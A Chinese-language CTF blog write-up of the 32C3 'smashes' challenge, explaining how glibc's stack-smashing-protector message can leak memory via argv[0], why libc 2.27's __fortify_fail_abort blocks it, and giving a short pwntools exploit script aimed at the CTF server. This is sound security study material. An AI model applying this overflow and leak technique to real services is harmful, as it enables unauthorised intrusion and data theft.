---
layout: post
title: "Stack Smashing Protector (SSP):__fortify_fail ->__fortify_fail_abort "
date: 2018-09-3
excerpt: "__stack_chk_fail的前世今生之我为什么复现不了ctfwiki上的smashes"
tags: [pwn, ctfwiki,SSP,stack,CTF]
feature: https://i.ytimg.com/vi/uSC3guWOvpk/maxresdefault.jpg
comments: true
---

# Stack Smashing Protector (SSP):__fortify_fail ->__fortify_fail_abort 

ctfwiki上的一道例题32C3 CTF smashes
https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-smash

这个姿势很有意思，通过canary保护的报错来leak出我们想要的信息。

它报错时会调用以下函数：
```
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}



void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```
直接会输出错误信息。

具体的原理和操作可以看ctfwiki或者直接搜32C3 CTF smashes的WP

然而我复现的时候发现在自己的虚拟机上只会输出
![Alt text](http://thyrsi.com/t6/366/1536070637x-1566657657.png)


查了资料发现和libc有关（？）

用的libc-2.27.so
![Alt text](http://thyrsi.com/t6/366/1536070669x-1566657657.png)

原因是我的__stack_chk_fail是这样的：
```
gdb-peda$ disassemble  __stack_chk_fail
Dump of assembler code for function __stack_chk_fail:
   0x00007ffff7eec450 <+0>:	lea    rsi,[rip+0x78be8]        # 0x7ffff7f6503f
   0x00007ffff7eec457 <+7>:	sub    rsp,0x8
   0x00007ffff7eec45b <+11>:	xor    edi,edi
   0x00007ffff7eec45d <+13>:	call   0x7ffff7eec470 <__GI___fortify_fail_abort>
```
它没有使用__fortify_fail，而是使用了fortify_fail_abort来防止argv [0]的泄露。



fortify_fail_abort是这样的
```
__fortify_fail_abort (_Bool need_backtrace, const char *msg)
{
  /* The loop is added only to keep gcc happy.  Don't pass down
     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]
     may point to the corrupted stack.  */
  while (1)
    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,
                    "*** %s ***: %s terminated\n",
                    msg,
                    (need_backtrace && __libc_argv[0] != NULL
                     ? __libc_argv[0] : "<unknown>"));
}
//https://code.woboq.org/userspace/glibc/debug/fortify_fail.c.html#40
```
可见，wihile循环里，``__libc_message ``的第一个参数从``2``变成了
``need_backtrace ? (do_abort | do_backtrace) : do_abort``

其中``do_abort``和``do_backtrace``分别是1和2，定义如下
```
enum __libc_message_action
{
  do_message        = 0,                /* Print message.  */
  do_abort        = 1 << 0,        /* Abort.  */ 
  do_backtrace        = 1 << 1        /* Backtrace.  */
};
```

就是取消了默认回溯->报错信息显示argv [0]这样子。




想用centos做，反正我centos的libc比较……古老

![Alt text](http://thyrsi.com/t6/366/1536070693x-1566657657.png)

确实也能够leak出程序名（？）

![Alt text](http://thyrsi.com/t6/366/1536070722x-1566657657.png)

但是centos没有pwntools也懒得装

直接怼远程试试好了

先找buf到argv[0]的偏移，直接r然后输入个ABC然后第二次输入那里ctrl+C终端看此时的栈。

![Alt text](http://thyrsi.com/t6/366/1536070741x-1566657657.png)

```
buf：0x7fffffffdf60
argv[0]:0x7fffffffe0a8 --> 0x7fffffffe178 --> 0x7fffffffe463 ("/root/Desktop/wiki/smashes")

hex(0x7fffffffe178 - 0x7fffffffdf60) = 0x218L
```

和ctf上描述的相符

然后find CTF 找到flag_addr

得到exp如下：

```
from pwn import *

context.log_level = 'debug'

io  = remote('pwn.jarvisoj.com', 9877)

flag_addr = 0x400d21


pattern = 'A'*0x218

payload = pattern + p64(flag_addr)


io.sendlineafter('name?',payload)

io.sendlineafter('flag:','')
io.interactive()
```

没成。

然后这里还有一个坑

……啊这里是64位的程序要用p64而不是p32，做32x做傻了。

还有一个就是

![Alt text](http://thyrsi.com/t6/366/1536070765x-1566657657.png)


然而用的应该是``0x400d20``不然会少一个字母（。）

所以改下这两个地方就可以了。

以为会遇到

设置环境变量``LIBC_FATAL_STDERR_=1``才能实现将标准错误信息通过管道输出到远程shell中

的坑然而并没有。
这个坑这里有说：
https://blog.csdn.net/happyorange2014/article/details/50459201

以上




参考：

1.https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.12_stack_chk_fail.html

2.https://qiita.com/sei0o/items/55db337b0829367a2052

3.http://site.pi3.com.pl/papers/ASSP.pdf


看第三个链接可以i意思意思继续深入了解一下SSP，里面介绍了不少和SSP相关的一些攻击。














